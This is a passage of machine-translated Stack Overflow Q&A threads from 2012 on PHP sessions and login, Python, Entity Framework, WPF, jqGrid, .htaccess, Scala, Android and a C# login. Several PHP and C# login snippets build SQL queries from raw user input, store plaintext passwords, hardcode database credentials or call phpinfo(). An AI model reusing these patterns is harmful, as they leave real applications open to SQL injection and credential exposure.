之后您可以添加自定义会话规则。因此，在数据库检查之后，您需要在 Auth.php 文件中创建一个会话变量，如下所示：

```
$_SESSION['loggedin']['username']=$_POST['users'];
$_SESSION['loggedin']['bros'] = md5($_SERVER['HTTP_USER_AGENT']); // To secure not needed in some cases. 
```

然后对于您要检查会话是否存在的每个其他页面。

```
if(isset($_SESSION['loggedin'])){
    //view page = true
} 
```

编辑：更好的验证；

```
if(!isset($_SESSION['loggedin']) || $_SESSION['loggedin']['bros'] !== md5($_SERVER['HTTP_USER_AGENT']))
{
    die('No access');
    sleep(1);
    header('location:Auth.php');
} 
```

将其应用于索引页面的顶部并删除 include(Auth.php); 那应该会更好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:24:58.577

嗨，穆罕默德，欢迎您。

你快到了，你设置

```
$_SESSION["user"] = $user; 
```

你验证

```
if ($loggedin){
  echo '<h2>Logged in</h2>...'
} 
```

你可能应该做类似的事情

```
if(isset($_SESSION["user"]) && !empty($_SESSION["user"])) { 
  echo '<h2>Logged in</h2>...' \
} 
```

您正在检查一个尚未设置的变量，因此默认情况下为 false。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:27:14.653

除非我遗漏了你没有在任何地方设置 $loggedin 的东西。

在 login.php 中更改以下部分

```
if ($_SESSION["loggedin"]){
    echo '<h2>Logged in</h2><p style="font-size:14px;">Welcome '.$_SESSION["user"].' you have sucessfully logged in.</p>';
} 
```

...然后在 Auth.php ...

```
if(mysqli_num_rows($res)==1){
    $_SESSION["user"] = $user;
    $_SESSION["loggedin"] = True;
    echo "You have sucessfully logged in";
} 
```

尽管您可以只检查 $_SESSION["user"] 中的值而不是存储登录标志。

# php - PHP会话注销错误

> ID：13530906
> 
> 赞同：2
> 
> 时间：2012-11-23T14:18:23.330
> 
> 标签：php, session, login

许多人可能会使用 PHP mySQL 函数作为网站的登录部分

我正在尝试使用此代码；

**在每个内容页面上 - 检查**是否登录（在每个内容页面的标题中）

```
<?php
session_start();
if(! isset($_SESSION["myusername"]) ){
header("location:main_login.php");
}
?>
<html>
<body>
Page Content Here
</body>
</html> 
```

**登录脚本**（由我的 main_login.php 页面引用）

```
<?php

ob_start();
$host="ClubEvents.db.9606426.hostedresource.com"; // Host name 
$username="ClubEventsRead"; // Mysql username 
$password="Pa55word!"; // Mysql password 
$db_name="ClubEvents"; // Database name 
$tbl_name="members"; // Table name 

// Connect to server and select databse.
mysql_connect("$host", "$username", "$password")or die("cannot connect"); 
mysql_select_db("$db_name")or die("cannot select DB");

// Define $myusername and $mypassword 
$myusername=$_POST['myusername']; 
$mypassword=$_POST['mypassword']; 

// To protect MySQL injection (more detail about MySQL injection)
$myusername = stripslashes($myusername);
$mypassword = stripslashes($mypassword);
$myusername = mysql_real_escape_string($myusername);
$mypassword = mysql_real_escape_string($mypassword);
$sql="SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'";
$result=mysql_query($sql);

// Mysql_num_row is counting table row
$count=mysql_num_rows($result);

// If result matched $myusername and $mypassword, table row must be 1 row
if($count==1){

// Register $myusername, $mypassword and redirect to file "login_success.php"
session_register("myusername");
session_register("mypassword"); 
header("location:login_success.php");
}
else {
echo "Wrong Username or Password";
}
ob_end_flush();
?> 
```

**注销代码**

```
<?
session_start();
session_destroy();

header("location:main_login.php");
exit();
?> 
```

**MAIN_LOGIN.php**

```
<table width="300" border="0" align="center" cellpadding="0" cellspacing="1" bgcolor="#CCCCCC">
<tr>
<form name="form1" method="post" action="checklogin.php">
<td>
<table width="100%" border="0" cellpadding="3" cellspacing="1" bgcolor="#FFFFFF">
<tr>
<td colspan="3"><strong>Member Login </strong></td>
</tr>
<tr>
<td width="78">Username</td>
<td width="6">:</td>
<td width="294"><input name="myusername" type="text" id="myusername"></td>
</tr>
<tr>
<td>Password</td>
<td>:</td>
<td><input name="mypassword" type="text" id="mypassword"></td>
</tr>
<tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td><input type="submit" name="Submit" value="Login"></td>
</tr>
</table>
</td>
</form>
</tr>
</table>
<?php
phpinfo()
?> 
```

但是有些东西不起作用，页面 login_success.php 应该只有在登录时才能访问，所以要么注销不起作用，要么 login_success.php 检查不起作用。但我不知道该怎么说，我都试着和他们一起玩了，还是没有进一步的前进

问候

亨利

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:20:00.150

*   `session_register()`已**弃用**。 **从 PHP 4.1.0 开始，首选使用 $_SESSION**

    `$_SESSION["myusername"] = $myusername;`

*   尝试**`session_destroy()`**代替**`session_unset()`**.

*   **您的 IF 语句也是错误的：**

    更改`isset($_SESSION[$myusername]`为 `isset($_SESSION["myusername"]`

这就是我管理登录的方式：

```
<?php session_start();

    require_once('../header.php');

    $sql = "SELECT ID, username, FROM users WHERE username='$_POST[username]' AND password='$_POST[password]'";
    $result = query($sql);

    //If nothing is returned from the DB then the credentials are wrong.
    if (!$row = mysql_fetch_array($result)) {
        header( 'Location: ../index.php' );
        die();
    }
    else {
        $user= $row;
    }

    //All user values ( id_user, username, password, firstname, lastname, avatar ) are saved in $_SESSION for later use.
    $_SESSION['ID'] = $user['ID'];                  
    $_SESSION['username'] = $user['username'];
    //This variable is used later to verify if a used is still logged in and proceed with loading a profile.
    $_SESSION['isLoggedIn'] = 1;

    header( 'Location: ../index.php' );
?> 
```

这就是我管理注销的方式：

```
<?php session_start();

    require_once('../header.php');

    //Session data is destroyed so as to prevent the user from accessing any profiles after disconnection.
    session_destroy(); 
    mysql_close($connection);

    header( 'Location: ../index.php' );
?> 
```

这就是我根据用户是否登录来管理页面内容的方式。

```
<?php session_start();

    echo "Page Content";

    if (@$_SESSION['isLoggedIn'] != 1) {
        showLogin();
    }
    else {
        showHome();
    }
?> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T14:21:56.980

我从来没有遇到过以下问题：

```
unset($_SESSION[$myusername]); 
```

这里的好处是您只清除登录会话，并且可以根据需要在会话中自由存储其他信息，因为`session_destroy()`将清除所有会话数据。

编辑：查看您的代码，如果设置了用户名会话，它总是将用户发送到登录页面。

改变：

```
<?php
session_start();
if( isset($_SESSION[$myusername]) ){
header("location:main_login.php");
}
?> 
```

到（注意 isset 之前的 !）。您只想在未设置会话时重定向到登录页面。

```
<?php
session_start();
if(! isset($_SESSION[$myusername]) ){
header("location:main_login.php");
}
?> 
```

**评论摘要：**

`Session[$myusername]`更改为`Session['myusername']`并且`isset`检查更改为`!isset`。这确定了会话一开始就没有设置。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:20:31.803

尝试`session_destroy();`必须帮助..

手册： http: [//php.net/manual/en/function.session-destroy.php](http://php.net/manual/en/function.session-destroy.php)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-03-22T13:20:20.073

您的注销代码应如下所示：

```
<?php
session_start();
$_SESSION = array();
if (ini_get("session.use_cookies")) {
    $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000,
        $params["path"], $params["domain"],
        $params["secure"], $params["httponly"]
    );
}
session_destroy();
header("Location: main_login.php"); exit;
?> 
```

区分大小写

# python - 在 Python 中拆分字符串

> ID：13530914
> 
> 赞同：0
> 
> 时间：2012-11-23T14:18:48.177
> 
> 标签：python, python-2.7

我有一个字符串是`####I_AM_SAM,`. 我想要的是只使用文本部分。所以我试图`split`像这样使用和拆分它：`line = f.readline().split(',' ,' ')`在哪里`f.readline()`读取这个“I_AM_SAM”。我希望 line[0] 来获取文本，但这给了我一个错误。请注意，文本“I_AM_SAM”之前有 4 个空格。我用“#”符号表示空格键。

```
line = f.readline().split(',' ,'    ') 
```

> TypeError：需要一个整数

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:25:50.323

```
line = f.readline().split(',' ,'    ')
  TypeError: an integer is required 
```

是由 的第二个参数引起的`split`，它必须是一个整数：

> S.split([sep[, maxsplit]]) -> 字符串列表
> 
> 返回 S 中的单词列表，使用 sep 作为分隔符字符串。如果给出了 maxsplit，则最多完成 maxsplit 拆分。如果 sep 未指定或为 None，则任何空白字符串都是分隔符，并且空字符串\n将从结果中删除。

在您的情况下，您需要`line = f.readline().split(',')[0]`. 另外，考虑使用[`re.sub`](http://docs.python.org/3/library/re.html#re.sub).

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T14:21:39.510

只需使用`strip()`：

```
In [34]: strs="    I_AM_SAM,"

In [35]: strs.strip(" ,") # pass a space " "and "," to strip
Out[35]: 'I_AM_SAM' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:26:46.633

Split 有两个参数，第一个是要分割的分隔符，第二个是它的最大分割数。所以这段代码：

```
'Hello there, this is a line'.split (' ', 2) 
```

将产生三个字符串：“Hello”、“there”和“this is a line”。

您想省略第二个参数，或将其设为 1（不确定，您的描述不够清楚）。如果要拆分多个字符，则需要多次调用才能拆分。

如果这不是您期望的答案，请让问题更清楚：您期望得到什么？您将第二个参数放在 split 中的原因是什么？还有一件事：如果文字字符串中的那个空格是一个制表符，请把它写成 \t 以便于阅读。

# entity-framework - 在 ASP.Net MVC4 应用程序上使用 EF 4.x 生成 .edmx 后清空 .Designer.cs 文件

> ID：13530915
> 
> 赞同：7
> 
> 时间：2012-11-23T14:18:47.700
> 
> 标签：entity-framework, asp.net-mvc-4, ef-database-first

我已经使用数据库优先方法（使用现有数据库）开始了一个非常简单的 ASP.Net MVC4 应用程序。我`.edmx`使用 ADO.Net 实体数据模型模板生成。该进程在选项`xxxxxxx.Designer.cs`下创建了一个文件`xxxxxxx.edmx`。但是，.cs 文件为空并显示以下消息。

```
// Default code generation is disabled for model 'C:\Visual Studio 2010\Projects\xxx\DProject\Models\BIReportDataModel.edmx'. 
// To enable default code generation, change the value of the 'Code Generation Strategy' designer
// property to an alternate value. This property is available in the Properties Window when the model is
// open in the designer. 
```

在消息之后，我更改了在`xxxxxxx.Designer.cs`文件中生成代码的属性。

问题：

1.  这是正确的做法吗？这个文件的目的是什么？
2.  我是否还需要通过右键单击“添加代码生成项”然后选择 EF DBContext Generator 从 .edmx 设计器页面生成强类型 DBContext 类？

数据库优先方法的过程到底是什么？

我看过很多帖子/博客/教程，所有似乎都非常令人困惑，主要是针对 CodeFirst 方法。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-12-31T06:37:11.377

Code First 在技术上既是数据库优先又没有数据库（它很灵活）您只需创建 POCO（普通的旧 C# 对象）这些类将根据您的需要映射您的数据库表模式结构，无论数据库是否存在。如果您不知道自己在做什么，那么您可能不想这样做。

**EDMX**，以前是设计器会被填充，但在 VS 2012 和更大的 tt 文件是默认设置。您应该使用 nuget 的 tt 编辑器来真正从它们中获得很多东西。

或者我建议您执行以下操作

```
 1\. Open the EDMX file - double click
 2\. Right Click in the EDMX diagram and click on Properties 
 3\. In the properties window change the "Code Generation Strategy" from  None to Default
 4\. Delte the tt files as you don't want both entities / contexts in project. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-01-25T11:36:53.667

在 Visual Studio 2017 中，要在设计器 .cs 文件中创建代码（使用实体框架 5.0），我会：

*   打开模型 .edmx 并更改“代码生成策略”
*   删除模型中的 .tt 文件

[![在此处输入图像描述](../Images/c6218104fa031b02f9bc7062ab8af5ca.png)](https://i.stack.imgur.com/a45CD.jpg)

# c# - ListView 将日期字段显示为空白

> ID：13530916
> 
> 赞同：0
> 
> 时间：2012-11-23T14:18:49.083
> 
> 标签：c#, wpf, visual-studio-2010, listview

您好，我有一个包含几个字段的列表视图，其中一个是名为 DatumNabavke 的日期字段。

```
public DateTime? DatumNabavke
    {
        get { return _datumNabavke; }
        set { _datumNabavke = value; OnPropertyChanged("DatumNabavke"); }

    } 
```

如您所见，它是一个可为空的日期字段。问题是，虽然它可以为 Null，但当它为 Null 时，它会使用 DateTimeNow 自动保存

```
if (adress.DatumNabavke == null)
                {
                    oleComd.Parameters[":datumnabavke"].Value = DateTime.Now;
                } 
```

因此，当我创建一个新行并将 DatumNabavke 字段留空时，它应该在我的 ListView 中使用 GridView 显示为今天的日期

```
<GridViewColumn   Header="Datum Nabavke" DisplayMemberBinding="{Binding DatumNabavke, StringFormat= d}" /> 
```

但由于某种原因，这不会发生。我显示的每一行，名称、id、值，都按预期显示，但由于某种原因，日期只是空白。

另一件事，在我的调试输出中，我收到以下错误：

System.Windows.Data 错误：11：后备值“x:Static sys:DateTime.Now”（类型“String”）无法转换为用于“SelectedDate”（类型“Nullable”）`1'). BindingExpression:Path=Adress.DatumZaduzenja; DataItem=null; target element is 'DatePicker' (Name='datumZaduzenja'); target property is 'SelectedDate' (type 'Nullable`1') FormatException:'System.FormatException: x:Static sys:DateTime.Now 不是 DateTime 的有效值。---> System.FormatException：字符串未被识别为有效的日期时间。在 System.ComponentModel.DateTimeConverter.ConvertFrom(ITypeDescriptorContext context, CultureInfoculture, Object value) 处的 System.DateTimeParse.Parse(String s, DateTimeFormatInfo dtfi, DateTimeStyles styles) 处有一个未知单词 --- End of inner异常堆栈跟踪 --- 在 System.ComponentModel.DateTimeConverter.ConvertFrom(ITypeDescriptorContext context, CultureInfoculture, Object value) 在 System.ComponentModel.NullableConverter.ConvertFrom(ITypeDescriptorContext context, CultureInfoculture, Object value) 在 System.Windows.Data.BindingExpressionBase .ConvertValue（对象值，DependencyProperty dp，

如果你们中的任何人可以提供帮助，我将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:46:24.177

我假设 DatumNabavke 是 ViewModel 中的一个属性，并且该 ViewModel 的集合已经成功绑定到您的 ListView.ItemsSource。你有没有尝试过：

```
public DateTime? DatumNabavke
{
    get { 
        if( _datumNabavke == null)
             return DateTime.Now;

        return _datumNabavke; 
    }
    set { _datumNabavke = value; OnPropertyChanged("DatumNabavke"); }

} 
```

你没有指定你在哪里调用这段代码

if (adress.DatumNabavke == null) { oleComd.Parameters[":datumnabavke"].Value = DateTime.Now; }

如果在 ViewModel 集合作为 ItemSource 加载之后发生这种情况，则绑定将永远不会起作用，因为这段代码不会引发属性通知。你也可以试试这个：

```
if (adress.DatumNabavke == null)
{
    oleComd.Parameters[":datumnabavke"].Value = DateTime.Now;
    OnPropertyChanged("DatumNabavke");
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T14:25:41.860

您是否尝试过在不同的属性中指定格式，例如

```
<GridViewColumn Header="Datum Nabavke" DisplayMemberBinding="{Binding DatumNabavke}" StringFormat="{}{0:dd/MM/yyyy}" /> 
```

# c# - 如何使用 .NET Remoting 复制程序集

> ID：13530918
> 
> 赞同：1
> 
> 时间：2012-11-23T14:18:53.910
> 
> 标签：c#, .net, remoting

有人知道如何将程序集从一台机器复制到另一台机器吗？我的设置是 WinXP、.NET Framework 2.0，我正在使用.Net Remoting，并且我将程序集作为字节数组传递，但由于某种原因，我最终得到了不同的结果。我不确定这是否是编码问题或类似的问题......这是服务器端代码任何帮助将不胜感激！

```
 public void SaveAssembly(byte[] assm, string path) {                       
        StreamWriter writer = new StreamWriter(Path);
        try{                                
            writer.AutoFlush = true;
            writer.Write(GetString(assm));                
            writer.Close();
        }
        finally{
            writer.Dispose();                
        }
    }

    static string GetString(byte[] bytes){
        char[] chars = new char[bytes.Length / sizeof(char)];
        System.Buffer.BlockCopy(bytes, 0, chars, 0, bytes.Length);
        return new string(chars);
    } 
```

注意：我必须在 NET 2.0 中使用 Remoting。我已经尝试过这个来获取字节数组，但它也没有工作......

```
var base64 = System.Convert.ToBase64String(assm);
var bytes  = System.Convert.FromBase64String(base64); 
```

# jqgrid - jqgrid 仅在有数据时才打开子网格

> ID：13530922
> 
> 赞同：2
> 
> 时间：2012-11-23T14:19:38.543
> 
> 标签：jqgrid, subgrid

这是我的子网格的声明：

```
 subGrid : true,
    subgridtype: 'json',
    subGridUrl: 'manuf_subgr.php',
    subGridModel: [{    name  : ['Package','Sticker','Manufacturer'], 
                        width : [85,50,100],
                        params: ['Catalogue'] 
                    } 
    ],
    gridComplete: function() {
        var timeOut = 50;
        var rowIds = $("#schedule").getDataIDs();
        $.each(rowIds, function (index, rowId) {
            if(rowId.row_cnt != 0){
                setTimeout(function() {
                    $("#schedule").expandSubGridRow(rowId);
                }, timeOut);
                timeOut = timeOut + 200;
            }
        });
    } 
```

我期望发生的是，`if(rowId.row_cnt != 0)`如果没有从 json 返回的数据，这条线会阻止打开子网格......但是无论如何，所有网格都是打开的......

有人可以帮助实施停止以打开空子网格吗？

完整代码：

```
jQuery("#schedule").jqGrid({
    url:'sched.php',
    datatype: "json",
    mtype:'GET',
    colNames:['Street_Date','Label','Catalogue', 'Artist', 'Title','UKDP','UPCEAN','format'],
    colModel:[
        {name:'Street_Date',index:'Street_Date desc, ID', sorttype:"date", formatter:'date', formatoptions: {newformat:'d/m/Y'}, width:75},
        {name:'label',index:'label', width:100,align:"center"},     
        {name:'Catalogue',index:'Catalogue', width:85},
        {name:'Artist',index:'Artist', width:120},
        {name:'Title',index:'Title', width:250},
        {name:'UKDP',index:'UKDP', width:35, align:"right", formatter:"number", sorttype:"float"},
        {name:'UPCEAN',index:'UPCEAN', width:120, align:"center"},      
        {name:'format',index:'format', width:70, sortable:false}
    ],
    height: "100%",
    rowNum:20,
    rowList:[10,20,30,50,100],
    sortname: 'id',
    viewrecords: true,
    sortorder: "desc",
    jsonReader : { 
        root: "rows", 
        page: "page", 
        total: "total", 
        records: "records", 
        repeatitems: true, 
        cell: "cell", 
        id: "id",
        userdata: "userdata", 
        subgrid: {root:"rows", repeatitems: true, cell:"cell" } 
    },
    pager: '#schedule_pager',
    caption:"Release Schedule",

    grouping:true,
    groupingView : {
        groupField : ['Street_Date']
    },

    subGrid : true,
    subgridtype: 'json',
    subGridUrl: 'manuf_subgr.php',
    subGridModel: [{    name  : ['Package','Sticker','Manufacturer'], 
                        width : [85,50,100],
                        params: ['Catalogue'] 
                    } 
    ],
    gridComplete: function() {
        var timeOut = 50;
        var rowIds = $("#schedule").getDataIDs();
        $.each(rowIds, function (index, rowId) {
            if(rowId.row_cnt != 0){
                setTimeout(function() {
                    $("#schedule").expandSubGridRow(rowId);
                }, timeOut);
                timeOut = timeOut + 200;
            }
        });
    },

    onSelectRow: function (rowId) {
        $("#schedule").jqGrid ('toggleSubGridRow', rowId);
    }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T18:23:16.183

您在评论中写道您是新手，这是您使用它的第二天。jqGrid 相对复杂，您尝试实现的第一个示例在我看来对于新手来说太复杂了。您尝试使用数据库中的数据加载填充 jqGrid，并在一个网格中进行分组和子网格。

您尝试在演示中实现的内容可以通过使用选项的`expandOnLoad: true`属性来解决`subGridOptions`：

```
subGridOptions: {expandOnLoad: true} 
```

您可以在“Hierarchy”/“Expand all Rows on load”下[的官方演示](http://trirand.com/blog/jqgrid/jqgrid.html)中看到该功能。我在[答案](https://stackoverflow.com/a/8049324/315935)中描述了一个重要问题。问题很快就出现了：jqGrid 中使用的 Ajax 请求的内部实现在另一个未决（服务器尚未回答）正在工作时阻止（跳过）Ajax 请求（请参见[此处](https://github.com/tonytomov/jqGrid/blob/v4.4.1/js/grid.subgrid.js#L126)`.grid.hDiv.loading`的代码位置，[此处](https://github.com/tonytomov/jqGrid/blob/v4.4.1/js/grid.subgrid.js#L146-L147)的子网格模块和[这里](https://github.com/tonytomov/jqGrid/blob/v4.4.1/js/grid.base.js#L1715)，[这里](https://github.com/tonytomov/jqGrid/blob/v4.4.1/js/grid.base.js#L1730)和[这里](https://github.com/tonytomov/jqGrid/blob/v4.4.1/js/grid.base.js#L1744)）。无论是您当前的实现还是您当前的实现都不能在前一个仍然没有响应的过程中启动新的 Ajax 请求。所以**你不能打开所有的子网格**`expandOnLoad: true`**. 您的主要问题是：“如何防止打开空子网格或如何隐藏它？”，我发现第二个（也是不太重要的）问题。即使您当前看到您的网站打开了所有子网格，也可能是从互联网更远的地方访问同一站点将仅在打开一个或一些子网格之后进行。**

 **因此，我认为您应该更改网页的设计（更改要在子网格中显示的内容）或更改实现，以便构建一个包含应打开的子网格列表的*队列，然后打开下一个网格**只有在*上一个之后才会打开。

Alternatively you can includes the data for *all subgrids* in the response for the main grid. In the case you should use `subGridRowExpanded` callback to fill the grids as [subgrid as grid](http://www.trirand.com/jqgridwiki/doku.php?id=wiki:subgrid_as_grid#definition). You you would use no `caption` and no `pager` option in the subgrids you will be get the same look as with the standard subgrids. Additionally you will have much more flexibility in the options. I personally prefer to subgrid as grid.**

# objective-c - setFirstWeekday 不起作用

> ID：13530926
> 
> 赞同：2
> 
> 时间：2012-11-23T14:19:47.027
> 
> 标签：objective-c, nsdate, nscalendar

我有一个问题：`setFirstWeekDay`不起作用...我不知道为什么...

```
 NSCalendar *gregorianT = [[NSCalendar alloc] initWithCalendarIdentifier:NSGregorianCalendar];
    [gregorianT setFirstWeekday:2];
 NSDateFormatter *formatDayWeek = [[NSDateFormatter alloc] init];
    [formatDayWeek setDateFormat:@"c EEEE"];

    NSLog(@"date : %@  value for date : %@", dateForMonth, [formatDayWeek stringFromDate:dateForMonth]); 
```

这就是我得到的：

```
date : 2012-11-23 14:18:28 +0000  value for date : 6 Friday 
```

我应该得到`date : 2012-11-23 14:18:28 +0000 value for date : 5 Friday`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T15:39:18.013

问题是您在这里实际上是在处理三个单独的对象：一个 NSCalendar、一个 NSDate 和一个 NSDateFormatter（它没有使用您创建的 NSCalendar 对象）。这三者没有隐含的联系。当您将 NSDate 传递给日期格式化程序时，您完全将您的自定义 NSCalendar 与修改后的工作日排除在等式之外。请记住：NSDate 对象只是从参考点开始的时间度量（例如从 2001 年 1 月 1 日午夜 GMT 算起的秒数）......它是具有“日名称”概念的日历对象，“日序数”， " 等时间的度量。

如果您想查看修改后的序数，请将您的日历对象传递给格式化程序：

```
NSCalendar *gregorianT = [[NSCalendar alloc] initWithCalendarIdentifier:NSGregorianCalendar];
[gregorianT setFirstWeekday:2];

NSDateFormatter *formatDayWeek = [[NSDateFormatter alloc] init];
[formatDayWeek setCalendar:gregorianT];
[formatDayWeek setDateFormat:@"c EEEE"];

NSLog(@"Value for date: %@", [formatDayWeek stringFromDate:dateForMonth]); 
```

...或者您可以直接从您的 NSCalendar 对象访问序数。

```
NSCalendar *gregorianT = [[NSCalendar alloc] initWithCalendarIdentifier:NSGregorianCalendar];
[gregorianT setFirstWeekday:2];

NSUInteger valueOfDay = [gregorianT ordinalityOfUnit:NSWeekdayCalendarUnit inUnit:NSWeekCalendarUnit forDate:dateForMonth];

NSLog(@"Value for date : %ld", (long)valueOfDay); 
```

# .htaccess - htaccess 将 %3F 和 %3D 重写为 ? 和 =

> ID：13530930
> 
> 赞同：3
> 
> 时间：2012-11-23T14:19:53.737
> 
> 标签：.htaccess, rewrite

我想重写所有最终必须`%3Ffull%3D1`的传入 URL`?full=1`

我在 htaccess 中尝试这个但不工作：

```
RewriteRule ^(.*)%3F(.+)%3D(.+)$ $1?$2=$3 [R=301] 
```

这是完整的.htaccess

```
<IfModule mod_rewrite.c>
Options +FollowSymlinks
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteRule ^(.*)%3F(.+)%3D(.+)$ $1?$2=$3 [R=301]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-24T18:06:36.443

我最近实现了以下 .htaccess 代码来完成此操作 - 我已对其进行了修改以适合您使用“完整”参数的场景。

```
# replace %3F with ? and %3D with =
RewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\ /([^\%]+)\%3[Ff]full\%3[dD]([^\ ]+)\ HTTP/
RewriteRule \.*$ http://www.mywebsite.com/%1?full=%2 [R=301,L] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T09:25:05.680

尝试`L`在处理查询字符串的规则中添加标志：

```
RewriteRule ^(.*)%3F(.+)%3D(.+)$ $1?$2=$3 [L,R=301] 
```

`RewriteRule . /index.php [L]`否则，重写后的**URI**最终可能会被最后一条规则*(*你的规则不匹配，你需要类似的东西：`%3Ffull%3D1`

 **```
RewriteCond %{QUERY_STRING} ^(.*)%3Ffull%3D1(.*)$
RewriteRule ^(.*)$ $1?%1&full=%2 [L,R=301] 
```**

# mysql - MySQL外键但查询

> ID：13530931
> 
> 赞同：0
> 
> 时间：2012-11-23T14:19:55.420
> 
> 标签：mysql, indexing, key

我有一列是外键。只要我添加的行具有父表中存在的数据，向列添加行就可以了。虽然，有些行没有属于父表的条目。我想用外键保留该列，但即使它没有父级，该列仍应存储它。

有没有办法在 MySQL 中做到这一点？

问候

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:21:28.090

外键约束强制该值存在于被引用的表中。如果您尝试插入引用表中不存在的值，那么它将失败。

你有两个选择：

1.  存储 NULL 而不是不存在的 ID。
2.  不要使用外键约束。

# scala - 按名称删除集合中的元素

> ID：13530935
> 
> 赞同：1
> 
> 时间：2012-11-23T14:20:16.013
> 
> 标签：scala, set, element

我有以下设置：

```
class Element (var Name:String, var Description: String)

var MoreElement: Set[Element] = Set(E1, E2, E3, ...) 
```

如何按名称删除集合 MoreElement 中的元素。

我找到了这个解决方案：

```
MoreElement -= (MoreElement find (_.Name == "nameOfElementToRemove")).get 
```

但是我不会使用get，因为如果你没有找到该项目就会抛出异常，但是我不希望没有异常。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T14:32:36.630

```
MoreElement = MoreElement filterNot (_.Name == "nameOfElementToRemove") 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-23T14:39:19.240

您问题的直接答案是使用过滤器，这意味着：

```
moreElements = moreElements.filter( _.name != "nameOfElementToRemove") 
```

请注意，这将扫描集合。如果你想要一个按名称索引的集合，你真的应该使用 Map。

但是，一些警告：

集合是唯一元素的集合。为了比较集合中的元素，它使用包含类型的相等运算符。在您的情况下，Element 类需要定义“equals”方法（和 hashCode），以便集合可以有效地比较实例。

此外，您需要记住 Set 是 Scala 中的不可变类，因此在您的示例中，您实际上是在创建一个新集合，尽管使用了一个似乎修改现有集合的运算符。

如果你想要一个可变集合，你需要导入 scala.collection.mutable.Set。

# android - 如何在android中收听双击视图？

> ID：13530937
> 
> 赞同：35
> 
> 时间：2012-11-23T14:20:17.263
> 
> 标签：android

我想`doubletap`在视图上检测 a ，例如 a `button`，然后知道它是哪个视图。我见过[这个类似](https://stackoverflow.com/questions/2640119/how-to-detect-doubletap-on-a-view)的问题，但他们说它是重复的问题似乎没有回答我的问题。

我能[找到](http://www.41post.com/4194/programming/android-detecting-double-tap-events)的只是`GestureDetector`在活动中添加一个，然后添加一个`OnDoubleTapListener`。但这只有在我点击屏幕的背景/布局时才会触发。当我（双击）a 时，它*不会*`button`被触发。

这是我里面的代码`onCreate`：

```
 gd = new GestureDetector(this, this);

    gd.setOnDoubleTapListener(new OnDoubleTapListener()  
    {  
        @Override  
        public boolean onDoubleTap(MotionEvent e)  
        {  
            Log.d("OnDoubleTapListener", "onDoubleTap");
            return false;  
        }  

        @Override  
        public boolean onDoubleTapEvent(MotionEvent e)  
        {  
            Log.d("OnDoubleTapListener", "onDoubleTapEvent");
            //if the second tap hadn't been released and it's being moved  
            if(e.getAction() == MotionEvent.ACTION_MOVE)  
            {  

            }  
            else if(e.getAction() == MotionEvent.ACTION_UP)//user released the screen  
            {  

            }  
            return false;  
        }  

        @Override  
        public boolean onSingleTapConfirmed(MotionEvent e)  
        {  
            Log.d("OnDoubleTapListener", "onSingleTapConfirmed");
            return false;  
        }  
    }); 
```

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2016-10-02T11:27:17.047

您只需使用这几行代码即可实现此目的。就是这么简单。

```
final GestureDetector gd = new GestureDetector(context, new GestureDetector.SimpleOnGestureListener(){

       //here is the method for double tap

        @Override
        public boolean onDoubleTap(MotionEvent e) {

            //your action here for double tap e.g.
            //Log.d("OnDoubleTapListener", "onDoubleTap");

            return true;
        }

        @Override
        public void onLongPress(MotionEvent e) {
            super.onLongPress(e);

        }

        @Override
        public boolean onDoubleTapEvent(MotionEvent e) {
            return true;
        }

        @Override
        public boolean onDown(MotionEvent e) {
            return true;
        }

    });

//here yourView is the View on which you want to set the double tap action

yourView.setOnTouchListener(new View.OnTouchListener() {
        @Override
        public boolean onTouch(View v, MotionEvent event) {

            return gd.onTouchEvent(event);
        }
    }); 
```

将这段代码放在要在视图上设置双击操作的活动或适配器上。

# syntax-error - 如何修复此语法错误？

> ID：13530939
> 
> 赞同：0
> 
> 时间：2012-11-23T14:20:25.217
> 
> 标签：syntax-error

这是我的登录代码。我正在研究我的 dbms 项目。我已删除所有错误，因为错误列表显示 0 个错误，但是当我执行此操作时，我的网页顶部出现此错误，即**关键字“用户”附近的语法不正确。**在剩下的页面上，出现了我的登录表单。我不知道如何解决这一切。请尽快告诉我。这是登录表单页面的代码。protected void Button1_Click(object sender, EventArgs e) { try { //为链接数据库建立必要的连接

```
 SqlConnection conn = new SqlConnection("Data Source=BUSHRA-PC\\SQLEXPRESS;Initial Catalog=fb;Integrated Security=True");

        conn.Open(); // openning connection
        SqlCommand cmd = new SqlCommand("select * from user where Userid='" + TextBox1.Text + "'", conn);
        //cmd.Connection = conn;
        SqlDataReader dr = null;
        dr = cmd.ExecuteReader();
        if (dr.Read())
        {
            TextBox1.Text = dr["Userid"].ToString();
        }
        cmd.Connection = conn;
        while (dr.Read())
        {
            Application["Userid"] = dr[0].ToString();
            Application["Password"] = dr[1].ToString();
            Application["Rollid"] = dr[2].ToString();

